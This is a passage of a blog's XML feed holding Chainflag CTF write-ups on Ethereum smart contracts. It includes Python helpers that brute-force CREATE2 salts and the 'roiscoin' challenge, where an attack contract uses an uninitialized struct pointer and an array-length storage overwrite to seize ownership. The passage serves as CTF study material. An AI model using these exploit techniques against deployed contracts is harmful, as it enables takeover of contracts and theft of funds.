class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetSpecialAddressByCreate2</span>(<span class="params">DeployAddress: <span class="built_in">str</span>, BytecodeHash: <span class="built_in">str</span>, content: <span class="built_in">str</span>, position:<span class="built_in">int</span> = <span class="number">0</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        获得包含特定内容的地址，通过 create2。根据 create2原理写出来的</span></span><br><span class="line"><span class="string">        如果想让地址的某个位置是特定内容的值，</span></span><br><span class="line"><span class="string">        此方法用于获取一个位置有特殊内容的地址</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        参数：</span></span><br><span class="line"><span class="string">            DeployAttackAddress (str): 部署合约地址</span></span><br><span class="line"><span class="string">            BytecodeHash (str): 待部署的合约的 bytecode的 hash 值</span></span><br><span class="line"><span class="string">            content: 包含的某个特定的值</span></span><br><span class="line"><span class="string">            position(可选)：地址的某个位置是特定内容的值，默认是0，可手动调整，比如 content=&#x27;ab&#x27;,position=-2就是计算得到的地址的后两位是&#x27;ab&#x27;，第position位是之后的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        返回值：</span></span><br><span class="line"><span class="string">             str: 第一个是 salt值，第二个是地址</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        例子： BlockchainUtils.GetSpecialAddressByCreate2(&quot;406187E1b3366B5da3539D99C4E88E42FC60De50&quot;,&quot;da647010355608442b3eab68e7dcc6d5b836f2628d2366ff8ae853413a643965&quot;,&quot;5a54&quot;)</span></span><br><span class="line"><span class="string">              得到的地址包含 &#x27;5a54&#x27;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">            start_time = time.time()  <span class="comment"># 获取当前时间戳</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">                current_time = time.time()</span><br><span class="line">                elapsed_time = current_time - start_time</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> elapsed_time &gt;= <span class="number">10</span>:</span><br><span class="line">                    <span class="keyword">raise</span> Exception(<span class="string">&quot;time out,maybe a wrong position&quot;</span>)</span><br><span class="line"></span><br><span class="line">                salt = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                s = <span class="string">&#x27;0xff&#x27;</span> + DeployAddress + salt + BytecodeHash</span><br><span class="line">                hashed = Web3.keccak(hexstr=s)</span><br><span class="line">                address = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;%02x&#x27;</span> % b <span class="keyword">for</span> b <span class="keyword">in</span> hashed])[<span class="number">24</span>:]</span><br><span class="line">                <span class="keyword">if</span> position == <span class="number">0</span> <span class="keyword">and</span> content <span class="keyword">in</span> address[position:]:</span><br><span class="line">                    logger.success(</span><br><span class="line">                        <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2]\n[content] <span class="subst">&#123;content&#125;</span> \n[salt] 0x<span class="subst">&#123;salt&#125;</span> \n[position] [<span class="subst">&#123;position&#125;</span>:<span class="subst">&#123;position+<span class="built_in">len</span>(content)&#125;</span>) \n[address] 0x<span class="subst">&#123;address&#125;</span>\n<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + salt, <span class="string">&quot;0x&quot;</span> + address</span><br><span class="line">                <span class="keyword">elif</span> position &gt; <span class="number">0</span> <span class="keyword">and</span> content <span class="keyword">in</span> address[position:position+<span class="built_in">len</span>(content)]:</span><br><span class="line">                    logger.success(</span><br><span class="line">                        <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2]\n[content] <span class="subst">&#123;content&#125;</span> \n[salt] 0x<span class="subst">&#123;salt&#125;</span> \n[position] [<span class="subst">&#123;position&#125;</span>:<span class="subst">&#123;position+<span class="built_in">len</span>(content)&#125;</span>) \n[address] 0x<span class="subst">&#123;address&#125;</span>\n<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + salt, <span class="string">&quot;0x&quot;</span> + address</span><br><span class="line">                <span class="keyword">elif</span> position &lt; <span class="number">0</span> <span class="keyword">and</span> position != -<span class="number">4</span> <span class="keyword">and</span> content <span class="keyword">in</span> address[position:position + <span class="built_in">len</span>(content)]:</span><br><span class="line">                    logger.success(</span><br><span class="line">                        <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2]\n[content] <span class="subst">&#123;content&#125;</span> \n[salt] 0x<span class="subst">&#123;salt&#125;</span> \n[position] [<span class="subst">&#123;position&#125;</span>:<span class="subst">&#123;position + <span class="built_in">len</span>(content)&#125;</span>) \n[address] 0x<span class="subst">&#123;address&#125;</span>\n<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + salt, <span class="string">&quot;0x&quot;</span> + address</span><br><span class="line">                <span class="keyword">elif</span> position == -<span class="number">4</span> <span class="keyword">and</span> content <span class="keyword">in</span> address[position:]:</span><br><span class="line">                    logger.success(</span><br><span class="line">                        <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2]\n[content] <span class="subst">&#123;content&#125;</span> \n[salt] 0x<span class="subst">&#123;salt&#125;</span> \n[position] [<span class="subst">&#123;position&#125;</span>:-1] \n[address] 0x<span class="subst">&#123;address&#125;</span> \n<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + salt, <span class="string">&quot;0x&quot;</span> + address</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            ExceptionInformation = format_exc()</span><br><span class="line">            logger.error(</span><br><span class="line">                <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2] Failed\n[content] <span class="subst">&#123;content&#125;</span>\n <span class="subst">&#123;ExceptionInformation&#125;</span><span class="subst">&#123;<span class="string">&#x27;-&#x27;</span>*<span class="number">80</span>&#125;</span>&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># BlockchainUtils.GetSpecialAddressByCreate2(&#x27;D4Fc541236927E2EAf8F27606bD7309C1Fc2cbee&#x27;,&#x27;5a65378286db3954a8273271b6402bb2c9e658f898a7a9fa23bf53ce3e134551&#x27;,&#x27;111&#x27;,37)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 02.ChainflagCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>14.storage @roiscoin</title>
      <link href="/2023/07/13/02.ChainflagCTF/14.storage%20@roiscoin/"/>
      <url>/2023/07/13/02.ChainflagCTF/14.storage%20@roiscoin/</url>
      
        <content type="html"><![CDATA[<h1 id="storage-roiscoin"><a href="#storage-roiscoin" class="headerlink" title="storage(roiscoin)"></a>storage(roiscoin)</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract FakeOwnerGame &#123;</span><br><span class="line">    event SendFlag(address _addr);</span><br><span class="line">    </span><br><span class="line">    uint randomNumber = 0; //0</span><br><span class="line">    uint time = now; //1</span><br><span class="line">    mapping (address =&gt; uint) public BalanceOf;//2</span><br><span class="line">    mapping (address =&gt; uint) public WinCount;//3</span><br><span class="line">    mapping (address =&gt; uint) public FailCount;//4</span><br><span class="line">    bytes32[] public codex;//5</span><br><span class="line">    address private owner;//6</span><br><span class="line">    uint256 settlementBlockNumber;//7</span><br><span class="line">    address guesser;//8</span><br><span class="line">    uint8 guess;//8</span><br><span class="line">    </span><br><span class="line">    struct FailedLog &#123;</span><br><span class="line">        uint failtag;</span><br><span class="line">        uint failtime;</span><br><span class="line">        uint success_count;</span><br><span class="line">        address origin;</span><br><span class="line">        uint fail_count;</span><br><span class="line">        bytes12 hash;</span><br><span class="line">        address msgsender;</span><br><span class="line">    &#125;</span><br><span class="line">    mapping(address =&gt; FailedLog[]) FailedLogs;//9</span><br><span class="line">    </span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag() onlyOwner &#123;</span><br><span class="line">        require(BalanceOf[msg.sender] &gt;= 2000);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = n;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2;</span><br><span class="line"></span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            WinCount[msg.sender] += 1;</span><br><span class="line">            BalanceOf[msg.sender] += 1000;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            FailCount[msg.sender] += 1;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        if (WinCount[msg.sender] == 2) &#123;</span><br><span class="line">            if (WinCount[msg.sender] + FailCount[msg.sender] &lt;= 2) &#123;</span><br><span class="line">                guesser = 0;</span><br><span class="line">                WinCount[msg.sender] = 0;</span><br><span class="line">                FailCount[msg.sender] = 0;</span><br><span class="line">                msg.sender.transfer(address(this).balance);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                FailedLog failedlog;</span><br><span class="line">                failedlog.failtag = 1; //randomNumber</span><br><span class="line">                failedlog.failtime = now; //time </span><br><span class="line">                failedlog.success_count = WinCount[msg.sender]; //BalanceOf</span><br><span class="line">                failedlog.origin = tx.origin; //WinCount</span><br><span class="line">                failedlog.fail_count = FailCount[msg.sender]; // FiilCount array&#x27;s length=1</span><br><span class="line">                failedlog.hash = bytes12(sha3(WinCount[msg.sender] + FailCount[msg.sender]));//codex</span><br><span class="line">                failedlog.msgsender = msg.sender; //codex</span><br><span class="line">                FailedLogs[msg.sender].push(failedlog);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function beOwner() payable &#123;</span><br><span class="line">        require(address(this).balance &gt; 0);</span><br><span class="line">        if(msg.value &gt; address(this).balance)&#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;//cheat: msg.value never greater than address(this).balance</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function revise(uint idx, bytes32 tmp) &#123;</span><br><span class="line">        if(uint(msg.sender) &amp; 0x61 == 0x61 &amp;&amp; tx.origin != msg.sender) &#123;</span><br><span class="line">            codex[idx] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><ul><li>goal<ul><li>be the owner</li><li>get 2000 points of <code>BalanceOf()</code></li></ul></li><li>vulnerability<ul><li>settle(): Uninitialized <code>struct</code> pointer</li><li>revise(): <code>CREATE2</code> and EVM’s storage</li></ul></li><li>idea<ol><li>cal the position of codex’s element. Because we can modify the content of slot by <code>revise()</code></li><li>cal the length we need to overlap the slot 6 ( owner )</li><li>modify the length of <code>codex</code> </li><li>call the <code>revise()</code> to be the owner</li></ol></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.6.12;</span><br><span class="line">// pay attention to the compiler&#x27;s version!</span><br><span class="line">// CREATE2 doesn&#x27;t in low version, it was added in 0.5.0</span><br><span class="line"></span><br><span class="line">interface IFakeOwnerGame&#123;</span><br><span class="line">    function revise(uint idx, bytes32 tmp)external;</span><br><span class="line">    function lockInGuess(uint8 n) external payable;</span><br><span class="line">    function settle() external;</span><br><span class="line">    function payforflag()external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    IFakeOwnerGame public level;</span><br><span class="line">    // 3.set the instance</span><br><span class="line">    function step01_setAddr(address _level) public &#123;</span><br><span class="line">        level = IFakeOwnerGame(_level);</span><br><span class="line">    &#125;</span><br><span class="line">    // 4.lock a number: 0, with 1 ether</span><br><span class="line">    function step02_setGuess(uint8 _x) public payable&#123;</span><br><span class="line">        level.lockInGuess.value(1 ether)(_x);</span><br><span class="line">    &#125;</span><br><span class="line">    // 5.call this func until BalanceOf equals to 2000 and WinCount equals to 2</span><br><span class="line">    function step03_settleUntil2Points()public&#123;</span><br><span class="line">        level.settle();</span><br><span class="line">    &#125;</span><br><span class="line">    // 6.cal the _slot and call it with _value(your address)</span><br><span class="line">    // _slot = 0xfc949c7b4a13586e39d89eead2f38644f9fb3efb5a0490b14f8fc0ceab44c256(need)</span><br><span class="line">    // _value = 0x000000000000000000000000FFCf0a1D3705222F984f0Df3b220A8C70162e061(be the owner)</span><br><span class="line">    function step04_modifyOwnerSlot(uint256 _slot,bytes32 _value)public&#123;</span><br><span class="line">        level.revise(_slot,_value);</span><br><span class="line">    &#125;   </span><br><span class="line">    // 7.successfully</span><br><span class="line">    function step05_complete()public&#123;</span><br><span class="line">        level.payforflag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract deployer&#123;</span><br><span class="line">    // 0.pay attention to the compiler&#x27;s version!</span><br><span class="line">    // CREATE2 doesn&#x27;t in low version, it was added in 0.5.0</span><br><span class="line"></span><br><span class="line">    // 2.deploy and get a specify contract: prefix:&#x27;ff&#x27; and suffix：&#x27;61&#x27;</span><br><span class="line">    bytes attackByteCode = hex&quot;608060405234801561001057600080fd5b50610462806100206000396000f3fe6080604052600436106100555760003560e01c806309773e951461005a57806363ab9a14146100ab5780636fd5ae15146100c2578063883b274a14610103578063dd9fbd9014610148578063f2b0f8191461015f575b600080fd5b34801561006657600080fd5b506100a96004803603602081101561007d57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610190565b005b3480156100b757600080fd5b506100c06101d3565b005b3480156100ce57600080fd5b506100d7610255565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561010f57600080fd5b506101466004803603604081101561012657600080fd5b810190808035906020019092919080359060200190929190505050610279565b005b34801561015457600080fd5b5061015d610310565b005b61018e6004803603602081101561017557600080fd5b81019080803560ff169060200190929190505050610392565b005b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166380e10aa56040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561023b57600080fd5b505af115801561024f573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630339f30083836040518363ffffffff1660e01b81526004018083815260200182815260200192505050600060405180830381600087803b1580156102f457600080fd5b505af1158015610308573d6000803e3d6000fd5b505050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166311da60b46040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561037857600080fd5b505af115801561038c573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632c0e0054670de0b6b3a7640000836040518363ffffffff1660e01b8152600401808260ff1681526020019150506000604051808303818588803b15801561041057600080fd5b505af1158015610424573d6000803e3d6000fd5b50505050505056fea2646970667358221220109dc61c8e70cdbf2515f6335b5a74d40e28d5f1c8e49489d784b1d0956d28f664736f6c634300060c0033&quot;;</span><br><span class="line">    function deploy(bytes32 _salt) public returns(address)&#123;</span><br><span class="line">        bytes memory bytecode = attackByteCode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)</span><br><span class="line">        &#125;</span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line">    // 1.get the hash and cal the salt</span><br><span class="line">    function getHash()public view returns(bytes32)&#123;</span><br><span class="line">        return keccak256(attackByteCode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract cal&#123;</span><br><span class="line">    // codex&#x27;s element: keccak256(5)</span><br><span class="line">    // result: 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3db0</span><br><span class="line">    function getDyArr(uint256 x) public pure returns(bytes32)&#123;</span><br><span class="line">        return keccak256(abi.encode(x));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // cal the codex&#x27;s length that we need to overlap the slot 6(owner)</span><br><span class="line">    function lengthNeed() public pure returns(uint256)&#123;</span><br><span class="line">        uint256 DyArrBegin = uint256(getDyArr(5));</span><br><span class="line">        uint256 slot = 6;</span><br><span class="line">        uint256 lengthNeed = type(uint256).max - DyArrBegin +slot + 1;</span><br><span class="line">        return lengthNeed;</span><br><span class="line">        // need=  114245411204874937970903528273105092893277201882823832116766311725579567940182</span><br><span class="line">        // need=  0xfc949c7b4a13586e39d89eead2f38644f9fb3efb5a0490b14f8fc0ceab44c256</span><br><span class="line">        // so the length we modify should greater than &#x27;need&#x27;, we can make the length whose prefix is &#x27;ff&#x27;</span><br><span class="line">        // of course, the suffix must be 61. ====&gt; CREATE2======&gt;so the slot 5(codex) can be this:</span><br><span class="line">        // length=115705583536238263701547016040993257322946596763381008814291318654012181268882</span><br><span class="line">        // length=0xffcf0a1d3705222f984f0df3b220a8c70162e061a66cc928b5edb82af9bd4992</span><br><span class="line">        // (length &gt; need) ===&gt; enough</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>EVM’s storage</li></ul><p><img src="https://moe.photo/images/2023/06/28/codex.png" alt></p><ul><li>CREATE2 get the specify address</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetSpecialAddressByCreate2_two</span>(<span class="params">DeployAddress: <span class="built_in">str</span>, BytecodeHash: <span class="built_in">str</span>, content1: <span class="built_in">str</span>, content2: <span class="built_in">str</span>, position1: <span class="built_in">int</span>, position2: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        获得包含特定内容的地址，通过 create2。根据 create2原理写出来的</span></span><br><span class="line"><span class="string">        如果想让地址的某个位置是特定内容的值，</span></span><br><span class="line"><span class="string">        此方法用于获取两个不同位置有特殊内容的地址</span></span><br><span class="line"><span class="string">        不支持负数索引,总共0~40位</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        参数：</span></span><br><span class="line"><span class="string">            DeployAttackAddress (str): 部署合约地址</span></span><br><span class="line"><span class="string">            BytecodeHash (str): 待部署的合约的 bytecode的 hash 值</span></span><br><span class="line"><span class="string">            content1: 包含的某个特定的值</span></span><br><span class="line"><span class="string">            content1: 包含的某个特定的值</span></span><br><span class="line"><span class="string">            position1：地址的某个位置是特定内容的值</span></span><br><span class="line"><span class="string">            position2：地址的某个位置是特定内容的值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        返回值：</span></span><br><span class="line"><span class="string">             str: 第一个是 salt值，第二个是地址</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">            start_time = time.time()  <span class="comment"># 获取当前时间戳</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">                current_time = time.time()</span><br><span class="line">                elapsed_time = current_time - start_time</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> elapsed_time &gt;= <span class="number">10</span>:</span><br><span class="line">                    <span class="keyword">raise</span> Exception(<span class="string">&quot;time out,maybe a wrong position&quot;</span>)</span><br><span class="line"></span><br><span class="line">                salt = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                s = <span class="string">&#x27;0xff&#x27;</span> + DeployAddress + salt + BytecodeHash</span><br><span class="line">                hashed = Web3.keccak(hexstr=s)</span><br><span class="line">                address = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;%02x&#x27;</span> % b <span class="keyword">for</span> b <span class="keyword">in</span> hashed])[<span class="number">24</span>:]</span><br><span class="line">                <span class="keyword">if</span> content1 <span class="keyword">in</span> address[position1:position1 + <span class="built_in">len</span>(content1)] <span class="keyword">and</span> content2 <span class="keyword">in</span> address[position2:position2 + <span class="built_in">len</span>(content2)]:</span><br><span class="line">                    logger.success(</span><br><span class="line">                        <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2_two]\n[content1] <span class="subst">&#123;content1&#125;</span> \n[position1] [<span class="subst">&#123;position1&#125;</span>:<span class="subst">&#123;position1 + <span class="built_in">len</span>(content1)&#125;</span>) \n[content2] <span class="subst">&#123;content2&#125;</span> \n[position2] [<span class="subst">&#123;position2&#125;</span>:<span class="subst">&#123;position2 + <span class="built_in">len</span>(content2)&#125;</span>) \n[salt] 0x<span class="subst">&#123;salt&#125;</span> \n[address] 0x<span class="subst">&#123;address&#125;</span>\n<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + salt, <span class="string">&quot;0x&quot;</span> + address</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            ExceptionInformation = format_exc()</span><br><span class="line">            logger.error(</span><br><span class="line">                <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2_two] Failed\n[content1] <span class="subst">&#123;content1&#125;</span> \n[content2] <span class="subst">&#123;content2&#125;</span>\n <span class="subst">&#123;ExceptionInformation&#125;</span><span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>&#125;</span>&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 